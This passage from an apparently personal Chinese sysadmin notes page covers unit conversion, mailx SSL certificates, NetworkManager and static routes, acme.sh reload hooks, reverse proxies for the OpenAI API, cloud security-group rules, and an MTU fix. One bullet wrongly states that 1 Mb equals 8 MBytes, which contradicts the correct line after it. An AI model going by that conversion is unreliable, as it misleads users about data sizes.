 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;- `MBytes`是`Megabytes`的缩写，表示兆字节。其中，&amp;#34;`M`&amp;#34; 代表兆（`Mega`），是一个表示数量级的单位前缀，&amp;#34;`Bytes`&amp;#34; 则代表字节。兆字节通常用于描述计算机存储容量的大小，例如硬盘、固态硬盘、内存等存储设备的容量。1 MByte 等于 1024 * 1024 字节，即 1048576 字节。
- `MBits`是`Megabits`的缩写，意思是兆比特(`Mb`)。它表示数据传输速率的单位之一，通常用于测量网络带宽、硬件设备传输速度等。`1Mb = 1*8 = 8MBytes(8MB)`
- `1 MB/s`(`Megabytes`/`MBytes`/`兆字节每秒`) 等于 `8 Mb/s`(`兆比特每秒`/`Megabits`/`MBits`)。&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="mailx-smtp使用ssl时邮件发送报错-error-in-certificate-peers-certificate-issuer-is-not-recognized"&gt;&lt;span&gt;mailx smtp使用ssl时，邮件发送报错 &amp;ldquo;Error in certificate: Peer’s certificate issuer is not recognized.&amp;rdquo;&lt;/span&gt;
 &lt;a href="#mailx-smtp%e4%bd%bf%e7%94%a8ssl%e6%97%b6%e9%82%ae%e4%bb%b6%e5%8f%91%e9%80%81%e6%8a%a5%e9%94%99-error-in-certificate-peers-certificate-issuer-is-not-recognized" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;# 生成证书
echo -n | openssl s_client -connect smtp.exmail.qq.com:465 | sed -ne &amp;#39;/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p&amp;#39; &amp;gt; /etc/mail.rc.d/qq.crt
certutil -A -n &amp;#34;GeoTrust SSL CA&amp;#34; -t &amp;#34;C,,&amp;#34; -d /etc/mail.rc.d -i /etc/mail.rc.d/qq.crt
certutil -A -n &amp;#34;GeoTrust Global CA&amp;#34; -t &amp;#34;C,,&amp;#34; -d /etc/mail.rc.d -i /etc/mail.rc.d/qq.crt

# 校验证书 
certutil -A -n &amp;#34;GeoTrust SSL CA - G3&amp;#34; -t &amp;#34;Pu,Pu,Pu&amp;#34; -d ./ -i qq.crt
## 成功显示以下内容
# Notice: Trust flag u is set automatically if the private key is present.

# 修改 /etc/mail.rc 末尾添加,即可 set nss-config-dir=/etc/mail.rc.d &lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="jenkins-设置国内插件源"&gt;&lt;span&gt;jenkins 设置国内插件源&lt;/span&gt;
 &lt;a href="#jenkins-%e8%ae%be%e7%bd%ae%e5%9b%bd%e5%86%85%e6%8f%92%e4%bb%b6%e6%ba%90" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;# 阿里云源: https://mirrors.aliyun.com/jenkins/updates/update-center.json
Jenkins管理界面中打开“Manage Plugins”（管理插件），然后选择“Advanced”（高级选项）标签页，在“Update Site”下拉列表中添加上述地址，并单击“Apply”（应用）按钮即可&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="etcsysconfignetwork-scripts-为空"&gt;&lt;span&gt;/etc/sysconfig/network-scripts 为空&lt;/span&gt;
 &lt;a href="#etcsysconfignetwork-scripts-%e4%b8%ba%e7%a9%ba" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;本来 &lt;code&gt;/etc/sysconfig/network-scripts&lt;/code&gt; 下是有网卡的配置文件的，我不知道是做了什么事情(我记得只是在调路由表)，在操作了几次后，我就发现我的网卡配置文件都没了，但是网络连接却是正常的，后面经多方资料查询，发现是&lt;code&gt;NetworkManager&lt;/code&gt;，他会自动管理网卡，而由他管理的话，那么就可能不再需要&lt;code&gt;/etc/sysconfig/network-scripts/&lt;/code&gt;下的配置文件了。他的默认配置文件是在&lt;code&gt;/etc/NetworkManager/system-connections&lt;/code&gt;下&lt;/li&gt;
&lt;li&gt;如何继续使用&lt;code&gt;/etc/sysconfig/network-scripts&lt;/code&gt;下的配置文件来继续管理网卡呢
&lt;pre&gt;&lt;code&gt;$&amp;gt; sudo vi /etc/NetworkManager/NetworkManager.conf
[main]
plugins=ifcfg-rh
# plugins 的值可以是以下几种：
# 如果plugins没有显式配置该选项，则NetworkManager将默认启用一组预安装的插件
# ifcfg-rh：用于读取和解析CentOS、RHEL等发行版相关的网卡配置文件。
# keyfile：用于从/etc/NetworkManager/system-connections目录中读取网络连接配置信息。
# dhcp：用于与DHCP服务器进行通信，并获取IP地址、子网掩码、DNS服务器等网络参数。
# wifi：用于管理Wi-Fi连接，并搜索可用的Wi-Fi热点。
# ibft、team、bridge 等等

[ifcfg-rh]
wifi.scan-rand-mac-address=no
# 用于控制系统在扫描Wi-Fi网络时是否使用随机MAC地址。具体来说，如果将该选项设置为“no”，则系统会使用真实的MAC地址扫描Wi-Fi网络。&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="双网卡优先级配置"&gt;&lt;span&gt;双网卡优先级配置&lt;/span&gt;
 &lt;a href="#%e5%8f%8c%e7%bd%91%e5%8d%a1%e4%bc%98%e5%85%88%e7%ba%a7%e9%85%8d%e7%bd%ae" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;网卡配置文件中 添加&lt;code&gt;IPV4_ROUTE_METRIC&lt;/code&gt;参数，值越低，优先级越高&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="网卡连接后执行某个脚本"&gt;&lt;span&gt;网卡连接后执行某个脚本&lt;/span&gt;
 &lt;a href="#%e7%bd%91%e5%8d%a1%e8%bf%9e%e6%8e%a5%e5%90%8e%e6%89%a7%e8%a1%8c%e6%9f%90%e4%b8%aa%e8%84%9a%e6%9c%ac" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;脚本存放位置: &lt;code&gt;/etc/NetworkManager/dispatcher.d&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="网卡配置文件固定路由设置"&gt;&lt;span&gt;网卡配置文件固定路由设置&lt;/span&gt;
 &lt;a href="#%e7%bd%91%e5%8d%a1%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6%e5%9b%ba%e5%ae%9a%e8%b7%af%e7%94%b1%e8%ae%be%e7%bd%ae" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;关闭网卡自动路由功能
&lt;pre&gt;&lt;code&gt;# /etc/sysconfig/network-scripts/ifcfg-enp0s31f6
PEERROUTES=no&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;添加固定路由
&lt;pre&gt;&lt;code&gt;# /etc/sysconfig/network-scripts/route-enp0s31f6
ADDRESS0=172.16.0.0 # 目标地址
NETMASK0=255.255.0.0 # 子网掩码
GATEWAY0=&amp;lt;172.16.31.1&amp;gt; &lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 class="heading-element" id="acmesh-证书安装---reloadcmd无效问题"&gt;&lt;span&gt;acme.sh 证书安装 &lt;code&gt;--reloadcmd&lt;/code&gt;无效问题&lt;/span&gt;
 &lt;a href="#acmesh-%e8%af%81%e4%b9%a6%e5%ae%89%e8%a3%85---reloadcmd%e6%97%a0%e6%95%88%e9%97%ae%e9%a2%98" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;一般来说，我们在使用自动续签证书的时候，需要让&lt;code&gt;acme.sh&lt;/code&gt;更新证书后自动重载一下&lt;code&gt;nginx&lt;/code&gt;,但是我们的&lt;code&gt;nginx&lt;/code&gt;基本都是自编译的，所以得使用&lt;code&gt;acme.sh&lt;/code&gt;的&lt;code&gt;--reloadcmd&lt;/code&gt;参数，但实际上在初始化时候如果你没有指定&lt;code&gt;--reloadcmd&lt;/code&gt;,那么第一次部署后即使你在更新的自动任务中添加&lt;code&gt;--reloadcmd&lt;/code&gt;也是无效的，这个时候可以直接修改配置证书的配置文件&lt;code&gt;/root/.acme.sh/example.com/example.com.conf&lt;/code&gt;，在里面添加一行&lt;code&gt;Le_ReloadCmd='/usr/bin/systemctl restart nginx.service'&lt;/code&gt;就可以了。当然，也可以在初始安装证书的时候添加&lt;code&gt;--reloadcmd&lt;/code&gt;参数，他会给你自动加入这个参数到配置文件中.&lt;/p&gt;
&lt;h2 class="heading-element" id="openai-api接口反向代理实现国内直接使用"&gt;&lt;span&gt;openai api接口反向代理实现国内直接使用&lt;/span&gt;
 &lt;a href="#openai-api%e6%8e%a5%e5%8f%a3%e5%8f%8d%e5%90%91%e4%bb%a3%e7%90%86%e5%ae%9e%e7%8e%b0%e5%9b%bd%e5%86%85%e7%9b%b4%e6%8e%a5%e4%bd%bf%e7%94%a8" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;nginx&lt;/code&gt; 反向代理设置(仅示例)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;server {
 listen 80;
 listen 443 ssl http2;

 server_name api.example.com;
 # ssl 相关配置
 include conf.d/api.example.com.ssl;


 access_log logs/api.example.com.log main;

 add_header Access-Control-Allow-Origin *;

 location / {
 default_type &amp;#39;application/json&amp;#39;;
 return 200 &amp;#39;{&amp;#34;status&amp;#34;: &amp;#34;ok&amp;#34;}&amp;#39;;
 }

 location /v1 {
 proxy_pass https://api.openai.com;
 proxy_ssl_server_name on;
 proxy_set_header Host api.openai.com;
 proxy_set_header X-Real-IP $remote_addr;
 }

 location ~ /openai/(.*) {
 proxy_pass https://api.openai.com/$1$is_args$args;
 proxy_set_header Host api.openai.com;
 proxy_set_header X-Real-IP $remote_addr;
 proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
 # 如果响应是流式的
 proxy_set_header Connection &amp;#39;&amp;#39;;
 proxy_http_version 1.1;
 chunked_transfer_encoding off;
 proxy_buffering off;
 proxy_cache off;
 # 如果响应是一般的
 proxy_buffer_size 128k;
 proxy_buffers 4 256k;
 proxy_busy_buffers_size 256k;
 }

}&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;利用&lt;code&gt;cloudflare&lt;/code&gt;的&lt;code&gt;Workers&lt;/code&gt;来实现&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;登陆后在左侧栏中，选择&lt;code&gt;Workers&lt;/code&gt;,点击&lt;code&gt;创建服务&lt;/code&gt;,输入一个看着顺眼的服务名,选择&lt;code&gt;http处理程序&lt;/code&gt;,然后点击&lt;code&gt;创建服务&lt;/code&gt;.然后点击右上角&lt;code&gt;快速编辑&lt;/code&gt;,在左侧框中填入一下代码，保存部署即可。
&lt;pre&gt;&lt;code&gt;const TELEGRAPH_URL = &amp;#39;https://api.openai.com&amp;#39;;


addEventListener(&amp;#39;fetch&amp;#39;, event =&amp;gt; {
event.respondWith(handleRequest(event.request))
})


async function handleRequest(request) {
const url = new URL(request.url);
url.host = TELEGRAPH_URL.replace(/^https?:\/\//, &amp;#39;&amp;#39;);


const modifiedRequest = new Request(url.toString(), {
 headers: request.headers,
 method: request.method,
 body: request.body,
 redirect: &amp;#39;follow&amp;#39;
});


const response = await fetch(modifiedRequest);
const modifiedResponse = new Response(response.body, response);


// 添加允许跨域访问的响应头
modifiedResponse.headers.set(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;);


return modifiedResponse;
}&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;上诉步骤完成后，配置工作基本就算完成了，&lt;code&gt;cloudflare&lt;/code&gt;会有一个默认的域名，但由于某些原因，可能访问效果不是很好，不过自定义域名可以解决，具体配置在&lt;code&gt;触发器&lt;/code&gt;中。此处可以定义你自己想要设定的域名，不过，要定义自定义域名，你的域名&lt;code&gt;ns&lt;/code&gt;需要指定到&lt;code&gt;cloudflare&lt;/code&gt;中，后续内容自行研究。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;vercel&lt;/code&gt; 反代&lt;code&gt;openai&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// vercel.json -- cmd: vercel --prod
{
 &amp;#34;rewrites&amp;#34;: [
 { &amp;#34;source&amp;#34;: &amp;#34;/&amp;#34;, &amp;#34;destination&amp;#34;: &amp;#34;https://api.openai.com&amp;#34; },
 {
 &amp;#34;source&amp;#34;: &amp;#34;/:match*&amp;#34;,
 &amp;#34;destination&amp;#34;: &amp;#34;https://api.openai.com/:match*&amp;#34;
 // },
 // {
 // &amp;#34;source&amp;#34;: &amp;#34;/openai/:match*&amp;#34;,
 // &amp;#34;destination&amp;#34;: &amp;#34;https://api.openai.com/:match*&amp;#34;
 }
 ]
}&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="云安全组配置规范"&gt;&lt;span&gt;云安全组配置规范&lt;/span&gt;
 &lt;a href="#%e4%ba%91%e5%ae%89%e5%85%a8%e7%bb%84%e9%85%8d%e7%bd%ae%e8%a7%84%e8%8c%83" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;不同的云厂商他的云策略是有差异的，阿里云的云安全组是以优先级来判定的规则先后的(1-100)数字越小，优先级越高。腾讯云为顺序判定，与iptables类似，从上向下。亚马逊无要求，默认拒绝所有流量。需主动配置内外网策略(未详细测试)&lt;/p&gt;
&lt;p&gt;云策略规则部署规范(以阿里云为例)&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;默认放行所有公网出流量(此项默认，可不做修改。优先级:1 )&lt;/li&gt;
&lt;li&gt;添加优先级&lt;strong&gt;最低的&lt;/strong&gt;入口流量限制(所有协议。优先级: 100)&lt;/li&gt;
&lt;li&gt;添加所有常用的可信端口(如:80、443。优先级: 90)&lt;/li&gt;
&lt;li&gt;添加受信ip(如: 公司、监控机、堡垒机等IP。优先级: 1-50)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;注意事项:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;建议每个受信组单独建立一个安全组，方便管理。&lt;/li&gt;
&lt;li&gt;建议配合云策略和服务器防火墙共同使用。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 class="heading-element" id="webmin-密码修改"&gt;&lt;span&gt;webmin 密码修改&lt;/span&gt;
 &lt;a href="#webmin-%e5%af%86%e7%a0%81%e4%bf%ae%e6%94%b9" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/usr/libexec/webmin/changepass.pl /etc/webmin &amp;lt;user&amp;gt; &amp;lt;passwd&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="记录一个nginx-反代规则"&gt;&lt;span&gt;记录一个nginx 反代规则&lt;/span&gt;
 &lt;a href="#%e8%ae%b0%e5%bd%95%e4%b8%80%e4%b8%aanginx-%e5%8f%8d%e4%bb%a3%e8%a7%84%e5%88%99" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;# 请求 以 /example 开头的uri，反向代理到 http://127.0.0.1:8081/example 下

location ~ ^/example($|/) {
 proxy_pass http://127.0.0.1:8081$request_uri;
 proxy_set_header Host $host;
 proxy_set_header X-Real-IP $remote_addr;
}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="debian-pull-镜像-408-错误"&gt;&lt;span&gt;debian pull 镜像 408 错误&lt;/span&gt;
 &lt;a href="#debian-pull-%e9%95%9c%e5%83%8f-408-%e9%94%99%e8%af%af" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;# 不知道原因,解决方案如下
# 参考地址: https://stackoverflow.com/questions/38386809/docker-error-http-408-response-body-invalid-character-looking-for-beginnin
sudo ip link set dev eth0 mtu 1450&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="在bash脚本中使用别名alias的方式"&gt;&lt;span&gt;在bash脚本中使用别名(alias)的方式&lt;/span&gt;
 &lt;a href="#%e5%9c%a8bash%e8%84%9a%e6%9c%ac%e4%b8%ad%e4%bd%bf%e7%94%a8%e5%88%ab%e5%90%8dalias%e7%9a%84%e6%96%b9%e5%bc%8f" class="heading-mark"&gt;
